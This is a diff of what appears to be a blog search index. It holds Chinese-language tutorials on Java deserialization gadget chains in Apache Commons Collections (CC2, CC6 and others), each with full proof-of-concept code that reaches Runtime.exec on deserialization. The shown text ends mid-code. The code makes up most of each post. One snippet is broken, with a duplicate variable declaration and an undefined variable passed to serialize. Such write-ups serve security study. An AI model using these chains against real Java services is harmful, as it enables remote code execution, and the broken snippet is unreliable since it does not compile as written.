@@ -230,33 +230,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Java反序列化CommonsCollections篇-CC2</title>
-    <url>/2024/06/02/JAVA%E5%AE%89%E5%85%A8/CC2/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC3中我们了解到<code>TemplatesImpl()</code>调用<code>Transformer()</code>方法就可以代码执行。</p>
-<p>CC2就在在这个基础上，结合CC4改写。CC2最大的优势就是不用<code>Transformer</code> 数组。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
-<li>JDK8u65</li>
-<li>CommonsCollections4</li>
-</ul>
-<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h2 id="CC2调用链分析"><a href="#CC2调用链分析" class="headerlink" title="CC2调用链分析"></a>CC2调用链分析</h2><p><img src="https://image.sp4rks.xyz/2024/06/CC2.png" alt="CC2"></p>
-<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//执行代码的类</span><br>        <span class="hljs-comment">//和CC4一样</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>		<span class="hljs-comment">//构造InvokerTransformer类去调用templates对象的newTransformer()方法</span><br>        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <span class="hljs-comment">//创建TransformingComparator类对象，传⼊一个临时的Transformer类对象(ConstantTransformer)，让代码序列化的时候不执行，在反序列化的时候执行。</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>        <br>        <br>        <span class="hljs-comment">//创建 PriorityQueue类对象传入transformingComparator对象，但是此时向队列⾥添加的元素就是我们前⾯创建的 TemplatesImpl对象了，这是因为最后调用 PriorityQueue.compare() 的时候是传入队列中的两个对象，然后 compare()中调用 Transformer.transform(obj1) 的时候用的是传入的第一个对象作为参数，因此这里需要将priorityQueue队列中的第一个对象设置为构造好的 templates 对象。</span><br>        <span class="hljs-comment">//PriorityQueue调用TransformingComparator.compare()</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, invokerTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602022510898.png" alt="image-20240602022510898"></p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(四)-摆烂的完结篇</a></p>
-<p><a href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/">Java反序列化Commons-Collections篇05-CC2链</a></p>
-]]></content>
-      <categories>
-        <category>JAVA</category>
-      </categories>
-      <tags>
-        <tag>JAVA安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Java反序列化CommonsCollections篇-CC11</title>
     <url>/2024/06/05/JAVA%E5%AE%89%E5%85%A8/CC11/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前在学习CC2的时候，CC2是CC3+CC4改写的。</p>
@@ -421,6 +394,33 @@
       </tags>
   </entry>
   <entry>
+    <title>Java反序列化CommonsCollections篇-CC2</title>
+    <url>/2024/06/02/JAVA%E5%AE%89%E5%85%A8/CC2/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC3中我们了解到<code>TemplatesImpl()</code>调用<code>Transformer()</code>方法就可以代码执行。</p>
+<p>CC2就在在这个基础上，结合CC4改写。CC2最大的优势就是不用<code>Transformer</code> 数组。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li>JDK8u65</li>
+<li>CommonsCollections4</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="CC2调用链分析"><a href="#CC2调用链分析" class="headerlink" title="CC2调用链分析"></a>CC2调用链分析</h2><p><img src="https://image.sp4rks.xyz/2024/06/CC2.png" alt="CC2"></p>
+<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//执行代码的类</span><br>        <span class="hljs-comment">//和CC4一样</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>		<span class="hljs-comment">//构造InvokerTransformer类去调用templates对象的newTransformer()方法</span><br>        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <span class="hljs-comment">//创建TransformingComparator类对象，传⼊一个临时的Transformer类对象(ConstantTransformer)，让代码序列化的时候不执行，在反序列化的时候执行。</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>        <br>        <br>        <span class="hljs-comment">//创建 PriorityQueue类对象传入transformingComparator对象，但是此时向队列⾥添加的元素就是我们前⾯创建的 TemplatesImpl对象了，这是因为最后调用 PriorityQueue.compare() 的时候是传入队列中的两个对象，然后 compare()中调用 Transformer.transform(obj1) 的时候用的是传入的第一个对象作为参数，因此这里需要将priorityQueue队列中的第一个对象设置为构造好的 templates 对象。</span><br>        <span class="hljs-comment">//PriorityQueue调用TransformingComparator.compare()</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, invokerTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602022510898.png" alt="image-20240602022510898"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(四)-摆烂的完结篇</a></p>
+<p><a href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/">Java反序列化Commons-Collections篇05-CC2链</a></p>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>JAVA安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java反序列化CommonsCollections篇-CC4</title>
     <url>/2024/06/01/JAVA%E5%AE%89%E5%85%A8/CC4/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前面几条链都是CommonsCollections3中产生的反序列化漏洞，后来Apache更新了大版本4.0，也产生了反序列化漏洞。</p>
@@ -511,6 +511,58 @@
 <h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, chainedTransformer);<br>        <br> <span class="hljs-comment">//TiedMapEntry放入lazymap，TiedMapEntry的构造器中第一个为Map，第二个为Object。所以map就可以传入我们构造好的lazymap</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-number">1</span>);<br> <br><span class="hljs-comment">//构思是反序列化自动执行BadAttributeValueExpException.readObject()，因为BadAttributeValueExpException放入的是tiedMapEntry，那就会执行tiedMapEntry的readObject()</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br>		<br>        <span class="hljs-comment">//反射修改值</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BadAttributeValueExpException</span>&gt; c = badAttributeValueExpException.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(badAttributeValueExpException, tiedMapEntry);<br><br><br>        serialize(badAttributeValueExpException1);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(四)-摆烂的完结篇</a></p>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>JAVA安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java反序列化CommonsCollections篇-CC6(最好用的CC链)</title>
+    <url>/2024/05/25/JAVA%E5%AE%89%E5%85%A8/CC6/</url>
+    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li><p>JAVA版本JAVA 21</p>
+</li>
+<li><p>commons-collections 3.2.1</p>
+</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC1现在来说的话比较鸡肋。因为在8u71以后<code>AnnotationInvocationHandler.readObject()</code>改变了。</p>
+<p>为了解决高版本的利用问题ysoserial给出了解决方案CommonsCollections6，也就是我们平常称的CC6。</p>
+<p>其实后面利用链和CC1是一样的,<code>LazyMap.get()</code></p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525145206477.png" alt="image-20240525145206477"></p>
+<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>从ysoserial可以看出链首是HashMap，其实HashMap我们挺熟悉。<code>HashMap.readObject()-&gt;HashMap.put()-&gt;HashMap.hash().(key)HashCode()</code></p>
+<p>所以现在只需要有一个类的<code>HashCode()</code>调用了<code>get()</code>就可以将这整段链链接起来。</p>
+<h3 id="攻击链分析"><a href="#攻击链分析" class="headerlink" title="攻击链分析"></a>攻击链分析</h3><p>作者是发现了<code>TiedMapEntry.HashCode().getValue()</code>中调用了<code>get()</code>,那这就可以把前后两段链链接起来。</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163703284.png" alt="image-20240525163703284"></p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163727555.png" alt="image-20240525163727555"></p>
+<p>完整利用链</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/CC6.png" alt="CC6"></p>
+<h3 id="实现攻击链"><a href="#实现攻击链" class="headerlink" title="实现攻击链"></a>实现攻击链</h3><p>后面代码执行的部分和CC1是一样的，复制就行</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <br>    <br>    	<span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br></code></pre></td></tr></table></figure>
+
+<p>接下来直接<code>new TiedMapEntry</code>，看<code>TiedMapEntry</code>的构造器，所以map可以直接传入之前的chainedTransformer，key随便传。</p>
+<p>然后<code>new HashMap</code>作为入口，放入把tiedMapEntry放进key。为什么把tiedMapEntry放进key而不是放进value中？因为<code>HashMap.readObject</code>是对key进行<code>hash()</code>。同样的value随便传。</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525162706680.png" alt="image-20240525162706680"></p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525162851644.png" alt="image-20240525162851644"></p>
+<p>但是我们在URLDNS那条链里面就有经验了，<code>HashMap.put</code>就会对key进行<code>hash()</code>，也就是对key调用<code>hashCode()</code>，会直接导致在序列化的时候直接走完这条链。</p>
+<p>所以得更改一下，改法很多，思路其实都是一样的，put时放进一个不能让链连接起来的对象或者方法，序列化的时候改回设想的调用链，让链能连接起来。</p>
+<p>这里主要写了两种方式:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span 